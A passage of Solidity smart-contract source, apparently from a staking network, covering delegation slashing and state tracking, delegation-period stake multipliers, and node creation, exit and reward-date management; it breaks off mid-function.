@param validatorId uint validator to slash\n\n     * @param amount uint amount to slash\n\n     *\n\n     */\n\n    function confiscate(uint validatorId, uint amount) external allow("Punisher") {\n\n        uint currentMonth = _getCurrentMonth();\n\n        FractionUtils.Fraction memory coefficient =\n\n            _delegatedToValidator[validatorId].reduceValue(amount, currentMonth);\n\n        _effectiveDelegatedToValidator[validatorId].reduceSequence(coefficient, currentMonth);\n\n        _putToSlashingLog(_slashesOfValidator[validatorId], coefficient, currentMonth);\n\n        _slashes.push(SlashingEvent({reducingCoefficient: coefficient, validatorId: validatorId, month: currentMonth}));\n\n    }\n\n\n\n    function getAndUpdateEffectiveDelegatedToValidator(uint validatorId, uint month)\n\n        external allow("Distributor") returns (uint)\n\n    {\n\n        return _effectiveDelegatedToValidator[validatorId].getAndUpdateValueInSequence(month);\n\n    }\n\n\n\n    function getAndUpdateDelegatedByHolderToValidatorNow(address holder, uint validatorId) external returns (uint) {\n\n        return _getAndUpdateDelegatedByHolderToValidator(holder, validatorId, _getCurrentMonth());\n\n    }\n\n\n\n    function getDelegation(uint delegationId)\n\n        external view checkDelegationExists(delegationId) returns (Delegation memory)\n\n    {\n\n        return delegations[delegationId];\n\n    }\n\n\n\n    function getFirstDelegationMonth(address holder, uint validatorId) external view returns(uint) {\n\n        return _firstDelegationMonth[holder].byValidator[validatorId];\n\n    }\n\n\n\n    function getDelegationsByValidatorLength(uint validatorId) external view returns (uint) {\n\n        return delegationsByValidator[validatorId].length;\n\n    }\n\n\n\n    function getDelegationsByHolderLength(address holder) external view returns (uint) {\n\n        return delegationsByHolder[holder].length;\n\n    }\n\n\n\n    function initialize(address contractsAddress) public override initializer {\n\n        Permissions.initialize(contractsAddress);\n\n    }\n\n\n\n    function getAndUpdateDelegatedToValidator(uint validatorId, uint month)\n\n        public allow("Nodes") returns (uint)\n\n    {\n\n        return _delegatedToValidator[validatorId].getAndUpdateValue(month);\n\n    }\n\n\n\n    function processSlashes(address holder, uint limit) public {\n\n        _sendSlashingSignals(_processSlashesWithoutSignals(holder, limit));\n\n    }\n\n\n\n    function processAllSlashes(address holder) public {\n\n        processSlashes(holder, 0);\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the token state of a given delegation.\n\n     *\n\n     * @param delegationId uint ID of the delegation\n\n     */\n\n    function getState(uint delegationId) public view checkDelegationExists(delegationId) returns (State state) {\n\n        if (delegations[delegationId].started == 0) {\n\n            if (delegations[delegationId].finished == 0) {\n\n                TimeHelpers timeHelpers = TimeHelpers(contractManager.getContract("TimeHelpers"));\n\n                if (_getCurrentMonth() == timeHelpers.timestampToMonth(delegations[delegationId].created)) {\n\n                    return State.PROPOSED;\n\n                } else {\n\n                    return State.REJECTED;\n\n                }\n\n            } else {\n\n                return State.CANCELED;\n\n            }\n\n        } else {\n\n            if (_getCurrentMonth() < delegations[delegationId].started) {\n\n                return State.ACCEPTED;\n\n            } else {\n\n                if (delegations[delegationId].finished == 0) {\n\n                    return State.DELEGATED;\n\n                } else {\n\n                    if (_getCurrentMonth() < delegations[delegationId].finished) {\n\n                        return State.UNDELEGATION_REQUESTED;\n\n                    } else {\n\n                        return State.COMPLETED;\n\n                    }\n\n                }\n\n            }\n\n        }\n\n    }\n\n\n\n    function getLockedInPendingDelegations(address holder) public view returns (uint) {\n\n        uint currentMonth = _getCurrentMonth();\n\n        if (_lockedInPendingDelegations[holder].month < currentMonth) {\n\n            return 0;\n\n        } else {\n\n            return _lockedInPendingDelegations[holder].amount;\n\n        }\n\n    }\n\n\n\n    function hasUnprocessedSlashes(address holder) public view returns (bool) {\n\n        return _everDelegated(holder) && _firstUnprocessedSlashByHolder[holder] < _slashes.length;\n\n    }\n\n\n\n    // private\n\n\n\n    function _addDelegation(\n\n        address holder,\n\n        uint validatorId,\n\n        uint amount,\n\n        uint delegationPeriod,\n\n        string memory info\n\n    )\n\n        private\n\n        returns (uint delegationId)\n\n    {\n\n        delegationId = delegations.length;\n\n        delegations.push(Delegation(\n\n            holder,\n\n            validatorId,\n\n            amount,\n\n            delegationPeriod,\n\n            now,\n\n            0,\n\n            0,\n\n            info\n\n        ));\n\n        delegationsByValidator[validatorId].push(delegationId);\n\n        delegationsByHolder[holder].push(delegationId);\n\n        _addToLockedInPendingDelegations(delegations[delegationId].holder, delegations[delegationId].amount);\n\n    }\n\n\n\n    function _calculateDelegationEndMonth(uint delegationId) private view returns (uint) {\n\n        uint currentMonth = _getCurrentMonth();\n\n        uint started = delegations[delegationId].started;\n\n\n\n        if (currentMonth < started) {\n\n            return started.add(delegations[delegationId].delegationPeriod);\n\n        } else {\n\n            uint completedPeriods = currentMonth.sub(started).div(delegations[delegationId].delegationPeriod);\n\n            return started.add(completedPeriods.add(1).mul(delegations[delegationId].delegationPeriod));\n\n        }\n\n    }\n\n\n\n    function _addToDelegatedToValidator(uint validatorId, uint amount, uint month) private {\n\n        _delegatedToValidator[validatorId].addToValue(amount, month);\n\n    }\n\n\n\n    function _addToEffectiveDelegatedToValidator(uint validatorId, uint effectiveAmount, uint month) private {\n\n        _effectiveDelegatedToValidator[validatorId].addToSequence(effectiveAmount, month);\n\n    }\n\n\n\n    function _addToDelegatedByHolder(address holder, uint amount, uint month) private {\n\n        _delegatedByHolder[holder].addToValue(amount, month);\n\n    }\n\n\n\n    function _addToDelegatedByHolderToValidator(\n\n        address holder, uint validatorId, uint amount, uint month) private\n\n    {\n\n        _delegatedByHolderToValidator[holder][validatorId].addToValue(amount, month);\n\n    }\n\n\n\n    function _removeFromDelegatedByHolder(address holder, uint amount, uint month) private {\n\n        _delegatedByHolder[holder].subtractFromValue(amount, month);\n\n    }\n\n\n\n    function _removeFromDelegatedByHolderToValidator(\n\n        address holder, uint validatorId, uint amount, uint month) private\n\n    {\n\n        _delegatedByHolderToValidator[holder][validatorId].subtractFromValue(amount, month);\n\n    }\n\n\n\n    function _addToEffectiveDelegatedByHolderToValidator(\n\n        address holder,\n\n        uint validatorId,\n\n        uint effectiveAmount,\n\n        uint month)\n\n        private\n\n    {\n\n        _effectiveDelegatedByHolderToValidator[holder][validatorId].addToSequence(effectiveAmount, month);\n\n    }\n\n\n\n    function _removeFromEffectiveDelegatedByHolderToValidator(\n\n        address holder,\n\n        uint validatorId,\n\n        uint effectiveAmount,\n\n        uint month)\n\n        private\n\n    {\n\n        _effectiveDelegatedByHolderToValidator[holder][validatorId].subtractFromSequence(effectiveAmount, month);\n\n    }\n\n\n\n    function _getAndUpdateDelegatedByHolder(address holder) private returns (uint) {\n\n        uint currentMonth = _getCurrentMonth();\n\n        processAllSlashes(holder);\n\n        return _delegatedByHolder[holder].getAndUpdateValue(currentMonth);\n\n    }\n\n\n\n    function _getAndUpdateDelegatedByHolderToValidator(\n\n        address holder,\n\n        uint validatorId,\n\n        uint month)\n\n        private returns (uint)\n\n    {\n\n        return _delegatedByHolderToValidator[holder][validatorId].getAndUpdateValue(month);\n\n    }\n\n\n\n    function _addToLockedInPendingDelegations(address holder, uint amount) private returns (uint) {\n\n        uint currentMonth = _getCurrentMonth();\n\n        if (_lockedInPendingDelegations[holder].month < currentMonth) {\n\n            _lockedInPendingDelegations[holder].amount = amount;\n\n            _lockedInPendingDelegations[holder].month = currentMonth;\n\n        } else {\n\n            assert(_lockedInPendingDelegations[holder].month == currentMonth);\n\n            _lockedInPendingDelegations[holder].amount = _lockedInPendingDelegations[holder].amount.add(amount);\n\n        }\n\n    }\n\n\n\n    function _subtractFromLockedInPendingDelegations(address holder, uint amount) private returns (uint) {\n\n        uint currentMonth = _getCurrentMonth();\n\n        require(\n\n            _lockedInPendingDelegations[holder].month == currentMonth,\n\n            "There are no delegation requests this month");\n\n        require(_lockedInPendingDelegations[holder].amount >= amount, "Unlocking amount is too big");\n\n        _lockedInPendingDelegations[holder].amount = _lockedInPendingDelegations[holder].amount.sub(amount);\n\n    }\n\n\n\n    function _getCurrentMonth() private view returns (uint) {\n\n        TimeHelpers timeHelpers = TimeHelpers(contractManager.getContract("TimeHelpers"));\n\n        return timeHelpers.getCurrentMonth();\n\n    }\n\n\n\n    function _getAndUpdateLockedAmount(address wallet) private returns (uint) {\n\n        return _getAndUpdateDelegatedByHolder(wallet).add(getLockedInPendingDelegations(wallet));\n\n    }\n\n\n\n    function _updateFirstDelegationMonth(address holder, uint validatorId, uint month) private {\n\n        if (_firstDelegationMonth[holder].value == 0) {\n\n            _firstDelegationMonth[holder].value = month;\n\n            _firstUnprocessedSlashByHolder[holder] = _slashes.length;\n\n        }\n\n        if (_firstDelegationMonth[holder].byValidator[validatorId] == 0) {\n\n            _firstDelegationMonth[holder].byValidator[validatorId] = month;\n\n        }\n\n    }\n\n\n\n    function _everDelegated(address holder) private view returns (bool) {\n\n        return _firstDelegationMonth[holder].value > 0;\n\n    }\n\n\n\n    function _removeFromDelegatedToValidator(uint validatorId, uint amount, uint month) private {\n\n        _delegatedToValidator[validatorId].subtractFromValue(amount, month);\n\n    }\n\n\n\n    function _removeFromEffectiveDelegatedToValidator(uint validatorId, uint effectiveAmount, uint month) private {\n\n        _effectiveDelegatedToValidator[validatorId].subtractFromSequence(effectiveAmount, month);\n\n    }\n\n\n\n    function _calculateDelegationAmountAfterSlashing(uint delegationId) private view returns (uint) {\n\n        uint startMonth = _delegationExtras[delegationId].lastSlashingMonthBeforeDelegation;\n\n        uint validatorId = delegations[delegationId].validatorId;\n\n        uint amount = delegations[delegationId].amount;\n\n        if (startMonth == 0) {\n\n            startMonth = _slashesOfValidator[validatorId].firstMonth;\n\n            if (startMonth == 0) {\n\n                return amount;\n\n            }\n\n        }\n\n        for (uint i = startMonth;\n\n            i > 0 && i < delegations[delegationId].finished;\n\n            i = _slashesOfValidator[validatorId].slashes[i].nextMonth) {\n\n            if (i >= delegations[delegationId].started) {\n\n                amount = amount\n\n                    .mul(_slashesOfValidator[validatorId].slashes[i].reducingCoefficient.numerator)\n\n                    .div(_slashesOfValidator[validatorId].slashes[i].reducingCoefficient.denominator);\n\n            }\n\n        }\n\n        return amount;\n\n    }\n\n\n\n    function _putToSlashingLog(\n\n        SlashingLog storage log,\n\n        FractionUtils.Fraction memory coefficient,\n\n        uint month)\n\n        private\n\n    {\n\n        if (log.firstMonth == 0) {\n\n            log.firstMonth = month;\n\n            log.lastMonth = month;\n\n            log.slashes[month].reducingCoefficient = coefficient;\n\n            log.slashes[month].nextMonth = 0;\n\n        } else {\n\n            require(log.lastMonth <= month, "Cannot put slashing event in the past");\n\n            if (log.lastMonth == month) {\n\n                log.slashes[month].reducingCoefficient =\n\n                    log.slashes[month].reducingCoefficient.multiplyFraction(coefficient);\n\n            } else {\n\n                log.slashes[month].reducingCoefficient = coefficient;\n\n                log.slashes[month].nextMonth = 0;\n\n                log.slashes[log.lastMonth].nextMonth = month;\n\n                log.lastMonth = month;\n\n            }\n\n        }\n\n    }\n\n\n\n    function _processSlashesWithoutSignals(address holder, uint limit)\n\n        private returns (SlashingSignal[] memory slashingSignals)\n\n    {\n\n        if (hasUnprocessedSlashes(holder)) {\n\n            uint index = _firstUnprocessedSlashByHolder[holder];\n\n            uint end = _slashes.length;\n\n            if (limit > 0 && index.add(limit) < end) {\n\n                end = index.add(limit);\n\n            }\n\n            slashingSignals = new SlashingSignal[](end.sub(index));\n\n            uint begin = index;\n\n            for (; index < end; ++index) {\n\n                uint validatorId = _slashes[index].validatorId;\n\n                uint month = _slashes[index].month;\n\n                uint oldValue = _getAndUpdateDelegatedByHolderToValidator(holder, validatorId, month);\n\n                if (oldValue.muchGreater(0)) {\n\n                    _delegatedByHolderToValidator[holder][validatorId].reduceValueByCoefficientAndUpdateSum(\n\n                        _delegatedByHolder[holder],\n\n                        _slashes[index].reducingCoefficient,\n\n                        month);\n\n                    _effectiveDelegatedByHolderToValidator[holder][validatorId].reduceSequence(\n\n                        _slashes[index].reducingCoefficient,\n\n                        month);\n\n                    slashingSignals[index.sub(begin)].holder = holder;\n\n                    slashingSignals[index.sub(begin)].penalty\n\n                        = oldValue.boundedSub(_getAndUpdateDelegatedByHolderToValidator(holder, validatorId, month));\n\n                }\n\n            }\n\n            _firstUnprocessedSlashByHolder[holder] = end;\n\n        }\n\n    }\n\n\n\n    function _processAllSlashesWithoutSignals(address holder)\n\n        private returns (SlashingSignal[] memory slashingSignals)\n\n    {\n\n        return _processSlashesWithoutSignals(holder, 0);\n\n    }\n\n\n\n    function _sendSlashingSignals(SlashingSignal[] memory slashingSignals) private {\n\n        Punisher punisher = Punisher(contractManager.getContract("Punisher"));\n\n        address previousHolder = address(0);\n\n        uint accumulatedPenalty = 0;\n\n        for (uint i = 0; i < slashingSignals.length; ++i) {\n\n            if (slashingSignals[i].holder != previousHolder) {\n\n                if (accumulatedPenalty > 0) {\n\n                    punisher.handleSlash(previousHolder, accumulatedPenalty);\n\n                }\n\n                previousHolder = slashingSignals[i].holder;\n\n                accumulatedPenalty = slashingSignals[i].penalty;\n\n            } else {\n\n                accumulatedPenalty = accumulatedPenalty.add(slashingSignals[i].penalty);\n\n            }\n\n        }\n\n        if (accumulatedPenalty > 0) {\n\n            punisher.handleSlash(previousHolder, accumulatedPenalty);\n\n        }\n\n    }\n\n\n\n    function _addToAllStatistics(uint delegationId) private {\n\n        DelegationPeriodManager delegationPeriodManager = DelegationPeriodManager(\n\n            contractManager.getContract("DelegationPeriodManager"));\n\n\n\n        uint currentMonth = _getCurrentMonth();\n\n        delegations[delegationId].started = currentMonth.add(1);\n\n        if (_slashesOfValidator[delegations[delegationId].validatorId].lastMonth > 0) {\n\n            _delegationExtras[delegationId].lastSlashingMonthBeforeDelegation =\n\n                _slashesOfValidator[delegations[delegationId].validatorId].lastMonth;\n\n        }\n\n\n\n        _addToDelegatedToValidator(\n\n            delegations[delegationId].validatorId,\n\n            delegations[delegationId].amount,\n\n            currentMonth.add(1));\n\n        _addToDelegatedByHolder(\n\n            delegations[delegationId].holder,\n\n            delegations[delegationId].amount,\n\n            currentMonth.add(1));\n\n        _addToDelegatedByHolderToValidator(\n\n            delegations[delegationId].holder,\n\n            delegations[delegationId].validatorId,\n\n            delegations[delegationId].amount,\n\n            currentMonth.add(1));\n\n        _updateFirstDelegationMonth(\n\n            delegations[delegationId].holder,\n\n            delegations[delegationId].validatorId,\n\n            currentMonth.add(1));\n\n        uint effectiveAmount = delegations[delegationId].amount.mul(delegationPeriodManager.stakeMultipliers(\n\n            delegations[delegationId].delegationPeriod));\n\n        _addToEffectiveDelegatedToValidator(\n\n            delegations[delegationId].validatorId,\n\n            effectiveAmount,\n\n            currentMonth.add(1));\n\n        _addToEffectiveDelegatedByHolderToValidator(\n\n            delegations[delegationId].holder,\n\n            delegations[delegationId].validatorId,\n\n            effectiveAmount,\n\n            currentMonth.add(1));\n\n    }\n\n}\n\ncontract DelegationPeriodManager is Permissions {\n\n\n\n    /**\n\n     * @dev Emitted when a new delegation period is specified.\n\n     */\n\n    event DelegationPeriodWasSet(\n\n        uint length,\n\n        uint stakeMultiplier\n\n    );\n\n\n\n    mapping (uint => uint) public stakeMultipliers;\n\n\n\n    /**\n\n     * @dev Creates a new available delegation period and return in the network.\n\n     * Only the owner may set new delegation period and returns in the network.\n\n     *\n\n     * Emits a DelegationPeriodWasSet event.\n\n     *\n\n     * @param monthsCount uint delegation duration in months\n\n     * @param stakeMultiplier uint return for delegation\n\n     */\n\n    function setDelegationPeriod(uint monthsCount, uint stakeMultiplier) external onlyOwner {\n\n        stakeMultipliers[monthsCount] = stakeMultiplier;\n\n\n\n        emit DelegationPeriodWasSet(monthsCount, stakeMultiplier);\n\n    }\n\n\n\n    /**\n\n     * @dev Checks whether given delegation period is allowed.\n\n     *\n\n     * @param monthsCount uint delegation duration in months\n\n     * @return bool True if delegation period is allowed\n\n     */\n\n    function isDelegationPeriodAllowed(uint monthsCount) external view returns (bool) {\n\n        return stakeMultipliers[monthsCount] != 0 ? true : false;\n\n    }\n\n\n\n    /**\n\n     * @dev Initial delegation period and multiplier settings.\n\n     */\n\n    function initialize(address contractsAddress) public override initializer {\n\n        Permissions.initialize(contractsAddress);\n\n        stakeMultipliers[3] = 100;  // 3 months at 100\n\n        stakeMultipliers[6] = 150;  // 6 months at 150\n\n        stakeMultipliers[12] = 200; // 12 months at 200\n\n    }\n\n}\n\ncontract Nodes is Permissions {\n\n    \n\n    using SafeCast for uint;\n\n\n\n    // All Nodes states\n\n    enum NodeStatus {Active, Leaving, Left}\n\n\n\n    struct Node {\n\n        string name;\n\n        bytes4 ip;\n\n        bytes4 publicIP;\n\n        uint16 port;\n\n        bytes32[2] publicKey;\n\n        uint startBlock;\n\n        uint lastRewardDate;\n\n        uint finishTime;\n\n        NodeStatus status;\n\n        uint validatorId;\n\n    }\n\n\n\n    // struct to note which Nodes and which number of Nodes owned by user\n\n    struct CreatedNodes {\n\n        mapping (uint => bool) isNodeExist;\n\n        uint numberOfNodes;\n\n    }\n\n\n\n    struct SpaceManaging {\n\n        uint8 freeSpace;\n\n        uint indexInSpaceMap;\n\n    }\n\n\n\n    // TODO: move outside the contract\n\n    struct NodeCreationParams {\n\n        string name;\n\n        bytes4 ip;\n\n        bytes4 publicIp;\n\n        uint16 port;\n\n        bytes32[2] publicKey;\n\n        uint16 nonce;\n\n    }\n\n\n\n    // array which contain all Nodes\n\n    Node[] public nodes;\n\n\n\n    SpaceManaging[] public spaceOfNodes;\n\n\n\n    // mapping for checking which Nodes and which number of Nodes owned by user\n\n    mapping (address => CreatedNodes) public nodeIndexes;\n\n    // mapping for checking is IP address busy\n\n    mapping (bytes4 => bool) public nodesIPCheck;\n\n    // mapping for checking is Name busy\n\n    mapping (bytes32 => bool) public nodesNameCheck;\n\n    // mapping for indication from Name to Index\n\n    mapping (bytes32 => uint) public nodesNameToIndex;\n\n    // mapping for indication from space to Nodes\n\n    mapping (uint8 => uint[]) public spaceToNodes;\n\n\n\n    mapping (uint => uint[]) public validatorToNodeIndexes;\n\n\n\n    uint public numberOfActiveNodes;\n\n    uint public numberOfLeavingNodes;\n\n    uint public numberOfLeftNodes;\n\n\n\n    // informs that Node is created\n\n    event NodeCreated(\n\n        uint nodeIndex,\n\n        address owner,\n\n        string name,\n\n        bytes4 ip,\n\n        bytes4 publicIP,\n\n        uint16 port,\n\n        uint16 nonce,\n\n        uint time,\n\n        uint gasSpend\n\n    );\n\n\n\n    // informs that node is fully finished quitting from the system\n\n    event ExitCompleted(\n\n        uint nodeIndex,\n\n        uint time,\n\n        uint gasSpend\n\n    );\n\n\n\n    // informs that owner starts the procedure of quitting the Node from the system\n\n    event ExitInited(\n\n        uint nodeIndex,\n\n        uint startLeavingPeriod,\n\n        uint time,\n\n        uint gasSpend\n\n    );\n\n\n\n    /**\n\n     * @dev removeSpaceFromFractionalNode - occupies space from Fractional Node\n\n     * function could be run only by Schains\n\n     * @param nodeIndex - index of Node at array of Fractional Nodes\n\n     * @param space - space which should be occupied\n\n     */\n\n    function removeSpaceFromNode(uint nodeIndex, uint8 space)\n\n        external\n\n        allowTwo("NodeRotation", "SchainsInternal")\n\n        returns (bool)\n\n    {\n\n        if (spaceOfNodes[nodeIndex].freeSpace < space) {\n\n            return false;\n\n        }\n\n        if (space > 0) {\n\n            _moveNodeToNewSpaceMap(\n\n                nodeIndex,\n\n                uint(spaceOfNodes[nodeIndex].freeSpace).sub(space).toUint8()\n\n            );\n\n        }\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev adSpaceToFractionalNode - returns space to Fractional Node\n\n     * function could be run only be Schains\n\n     * @param nodeIndex - index of Node at array of Fractional Nodes\n\n     * @param space - space which should be returned\n\n     */\n\n    function addSpaceToNode(uint nodeIndex, uint8 space) external allow("Schains") {\n\n        if (space > 0) {\n\n            _moveNodeToNewSpaceMap(\n\n                nodeIndex,\n\n                uint(spaceOfNodes[nodeIndex].freeSpace).add(space).toUint8()\n\n            );\n\n        }\n\n    }\n\n\n\n    /**\n\n     * @dev changeNodeLastRewardDate - changes Node\'s last reward date\n\n     * function could be run only by SkaleManager\n\n     * @param nodeIndex - index of Node\n\n     */\n\n    function changeNodeLastRewardDate(uint nodeIndex) external allow("SkaleManager") {\n\n        nodes[nodeIndex].lastRewardDate = block.timestamp;\n\n    }\n\n\n\n    function changeNodeFinishTime(uint nodeIndex, uint time) external allow("SkaleManager") {\n\n        nodes[nodeIndex].finishTime = time;\n\n    }\n\n\n\n    /**\n\n     * @dev createNode - creates new Node and add it to the Nodes contract\n\n     * function could be only run by SkaleManager\n\n     * @param from - owner of Node\n\n     * @return nodeIndex - index of Node\n\n     */\n\n    function createNode(address from, NodeCreationParams calldata params)\n\n        external\n\n        allow("SkaleManager")\n\n        returns (uint nodeIndex)\n\n    {\n\n        // checks that Node has correct data\n\n        require(params.ip != 0x0 && !nodesIPCheck[params.ip], "IP address is zero or is not available");\n\n        require(!nodesNameCheck[keccak256(abi.encodePacked(params.name))], "Name has already registered");\n\n        require(params.port > 0, "Port is zero");\n\n\n\n        uint validatorId = ValidatorService(\n\n            contractManager.getContract("ValidatorService")).getValidatorIdByNodeAddress(from);\n\n\n\n        // adds Node to Nodes contract\n\n        nodeIndex = _addNode(\n\n            from,\n\n            params.name,\n\n            params.ip,\n\n            params.publicIp,\n\n            params.port,\n\n            params.publicKey,\n\n            validatorId);\n\n\n\n        emit NodeCreated(\n\n            nodeIndex,\n\n            from,\n\n            params.name,\n\n            params.ip,\n\n            params.publicIp,\n\n            params.port,\n\n            params.nonce,\n\n            block.timestamp,\n\n            gasleft());\n\n    }\n\n\n\n    /**\n\n     * @dev initExit - initiate a procedure of quitting the system\n\n     * function could be only run by SkaleManager\n\n     * @param nodeIndex - index of Node\n\n     * @return true - if everything OK\n\n     */\n\n    function initExit(uint nodeIndex) external allow("SkaleManager") returns (bool) {\n\n\n\n        _setNodeLeaving(nodeIndex);\n\n\n\n        emit ExitInited(\n\n            nodeIndex,\n\n            block.timestamp,\n\n            block.timestamp,\n\n            gasleft());\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @dev completeExit - finish a procedure of quitting the system\n\n     * function could be run only by SkaleManager\n\n     * @param nodeIndex - index of Node\n\n     * @return amount of SKL which be returned\n\n     */\n\n    function completeExit(uint nodeIndex) external allow("SkaleManager") returns (bool) {\n\n        require(isNodeLeaving(nodeIndex), "Node is not Leaving");\n\n\n\n        _setNodeLeft(nodeIndex);\n\n        _deleteNode(nodeIndex);\n\n\n\n        emit ExitCompleted(\n\n            nodeIndex,\n\n            block.timestamp,\n\n            gasleft());\n\n        return true;\n\n    }\n\n\n\n    function deleteNodeForValidator(uint validatorId, uint nodeIndex) external allow("SkaleManager") {\n\n        ValidatorService validatorService = ValidatorService(contractManager.getContract("ValidatorService"));\n\n        require(validatorService.validatorExists(validatorId), "Validator with such ID does not exist");\n\n        uint[] memory validatorNodes = validatorToNodeIndexes[validatorId];\n\n        uint position = _findNode(validatorNodes, nodeIndex);\n\n        if (position < validatorNodes.length) {\n\n            validatorToNodeIndexes[validatorId][position] =\n\n                validatorToNodeIndexes[validatorId][validatorNodes.length.sub(1)];\n\n        }\n\n        validatorToNodeIndexes[validatorId].pop();\n\n    }\n\n\n\n    function checkPossibilityCreatingNode(address nodeAddress) external allow("SkaleManager") {\n\n        ValidatorService validatorService = ValidatorService(contractManager.getContract("ValidatorService"));\n\n        DelegationController delegationController = DelegationController(\n\n            contractManager.getContract("DelegationController")\n\n        );\n\n        uint validatorId = validatorService.getValidatorIdByNodeAddress(nodeAddress);\n\n        require(validatorService.isAuthorizedValidator(validatorId), "Validator is not authorized to create a node");\n\n        uint[] memory validatorNodes = validatorToNodeIndexes[validatorId];\n\n        uint delegationsTotal = delegationController.getAndUpdateDelegatedToValidatorNow(validatorId);\n\n        uint msr = ConstantsHolder(contractManager.getContract("ConstantsHolder")).msr();\n\n        require(\n\n            validatorNodes.length.add(1).mul(msr) <= delegationsTotal,\n\n            "Validator must meet the Minimum Staking Requirement");\n\n    }\n\n\n\n    function checkPossibilityToMaintainNode(\n\n        uint validatorId,\n\n        uint nodeIndex\n\n    )\n\n        external\n\n        allow("Bounty")\n\n        returns (bool)\n\n    {\n\n        DelegationController delegationController = DelegationController(\n\n            contractManager.getContract("DelegationController")\n\n        );\n\n        ValidatorService validatorService = ValidatorService(contractManager.getContract("ValidatorService"));\n\n        require(validatorService.validatorExists(validatorId), "Validator with such ID does not exist");\n\n        uint[] memory validatorNodes = validatorToNodeIndexes[validatorId];\n\n        uint position = _findNode(validatorNodes, nodeIndex);\n\n        require(position < validatorNodes.length, "Node does not exist for this Validator");\n\n        uint delegationsTotal = delegationController.getAndUpdateDelegatedToValidatorNow(validatorId);\n\n        uint msr = ConstantsHolder(contractManager.getContract("ConstantsHolder")).msr();\n\n        return position.add(1).mul(msr) <= delegationsTotal;\n\n    }\n\n\n\n    function getNodesWithFreeSpace(uint8 freeSpace) external view returns (uint[] memory) {\n\n        ConstantsHolder constantsHolder = ConstantsHolder(contractManager.getContract("ConstantsHolder"));\n\n        uint[] memory nodesWithFreeSpace = new uint[](countNodesWithFreeSpace(freeSpace));\n\n        uint cursor = 0;\n\n        for (uint8 i = freeSpace; i <= constantsHolder.TOTAL_SPACE_ON_NODE(); ++i) {\n\n            for (uint j = 0; j < spaceToNodes[i].length; j++) {\n\n                nodesWithFreeSpace[cursor] = spaceToNodes[i][j];\n\n                ++cursor;\n\n            }\n\n        }\n\n        return nodesWithFreeSpace;\n\n    }\n\n\n\n    /**\n\n     * @dev isTimeForReward - checks if time for reward has come\n\n     * @param nodeIndex - index of Node\n\n     * @return if time for reward has come - true, else - false\n\n     */\n\n    function isTimeForReward(uint nodeIndex) external view returns (bool) {\n\n        ConstantsHolder constantsHolder = ConstantsHolder(contractManager.getContract("ConstantsHolder"));\n\n        return uint(nodes[nodeIndex].lastRewardDate).add(constantsHolder.rewardPeriod()) <= block.timestamp;\n\n    }\n\n\n\n    /**\n\n     * @dev isNodeExist - checks existence of Node at this address\n\n     * @param from - account address\n\n     * @param nodeIndex - index of Node\n\n     * @return if exist - true, else - false\n\n     */\n\n    function isNodeExist(address from, uint nodeIndex) external view returns (bool) {\n\n        return nodeIndexes[from].isNodeExist[nodeIndex];\n\n    }\n\n\n\n    /**\n\n     * @dev getNodeIP - get ip address of Node\n\n     * @param nodeIndex - index of Node\n\n     * @return ip address\n\n     */\n\n    function getNodeIP(uint nodeIndex) external view returns (bytes4) {\n\n        require(nodeIndex < nodes.length, "Node does not exist");\n\n        return nodes[nodeIndex].ip;\n\n    }\n\n\n\n    /**\n\n     * @dev getNodePort - get Node\'s port\n\n     * @param nodeIndex - index of Node\n\n     * @return port\n\n     */\n\n    function getNodePort(uint nodeIndex) external view returns (uint16) {\n\n        return nodes[nodeIndex].port;\n\n    }\n\n\n\n    function getNodePublicKey(uint nodeIndex) external view returns (bytes32[2] memory) {\n\n        return nodes[nodeIndex].publicKey;\n\n    }\n\n\n\n    function getNodeFinishTime(uint nodeIndex) external view returns (uint) {\n\n        return nodes[nodeIndex].finishTime;\n\n    }\n\n\n\n    /**\n\n     * @dev isNodeLeft - checks if Node status Left\n\n     * @param nodeIndex - index of Node\n\n     * @return if Node status Left - true, else - false\n\n     */\n\n    function isNodeLeft(uint nodeIndex) external view returns (bool) {\n\n        return nodes[nodeIndex].status == NodeStatus.Left;\n\n    }\n\n\n\n    /**\n\n     * @dev getNodeLastRewardDate - get Node last reward date\n\n     * @param nodeIndex - index of Node\n\n     * @return Node last reward date\n\n     */\n\n    function getNodeLastRewardDate(uint nodeIndex) external view returns (uint) {\n\n        return nodes[nodeIndex].lastRewardDate;\n\n    }\n\n\n\n    /**\n\n     * @dev getNodeNextRewardDate - get Node next reward date\n\n     * @param nodeIndex - index of Node\n\n     * @return Node next reward date\n\n     */\n\n    function getNodeNextRewardDate(uint nodeIndex) external view returns (uint) {\n\n        ConstantsHolder constantsHolder = ConstantsHolder(contractManager.getContract("ConstantsHolder"));\n\n        return nodes[nodeIndex].lastRewardDate.add(constantsHolder.rewardPeriod());\n\n    }\n\n\n\n    /**\n\n     * @dev getNumberOfNodes - get number of Nodes\n\n     * @return number of Nodes\n\n     */\n\n    function getNumberOfNodes() external view returns (uint) {\n\n        return nodes.length;\n\n    }\n\n\n\n    /**\n\n     * @dev getNumberOfFullNodes - get number Online Nodes\n\n     * @return number of active nodes plus number of leaving nodes\n\n     */\n\n    function getNumberOnlineNodes() external view returns (uint) {\n\n        return numberOfActiveNodes.add(numberOfLeavingNodes);\n\n    }\n\n\n\n    /**\n\n     * @dev getActiveNodeIPs - get array of ips of Active Nodes\n\n     * @return activeNodeIPs - array of ips of Active Nodes\n\n     */\n\n    function getActiveNodeIPs() external view returns (bytes4[] memory activeNodeIPs) {\n\n        activeNodeIPs = new bytes4[](numberOfActiveNodes);\n\n        uint indexOfActiveNodeIPs = 0;\n\n        for (uint indexOfNodes = 0; indexOfNodes < nodes.length; indexOfNodes++) {\n\n            if (isNodeActive(indexOfNodes)) {\n\n                activeNodeIPs[indexOfActiveNodeIPs] = nodes[indexOfNodes].ip;\n\n                indexOfActiveNodeIPs++;\n\n            }\n\n        }\n\n    }\n\n\n\n    /**\n\n     * @dev getActiveNodesByAddress - get array of indexes of Active Nodes, which were\n\n     * created by msg.sender\n\n     * @return activeNodesByAddress Array of indexes of Active Nodes, which were created by msg.sender\n\n     */\n\n    function getActiveNodesByAddress() external view returns (uint[] memory activeNodesByAddress) {\n\n        activeNodesByAddress = new uint[](nodeIndexes[msg.sender].numberOfNodes);\n\n        uint indexOfActiveNodesByAddress = 0;\n\n        for (uint indexOfNodes = 0; indexOfNodes < nodes.length; indexOfNodes++) {\n\n            if (nodeIndexes[msg.sender].isNodeExist[indexOfNodes] && isNodeActive(indexOfNodes)) {\n\n                activeNodesByAddress[indexOfActiveNodesByAddress] = 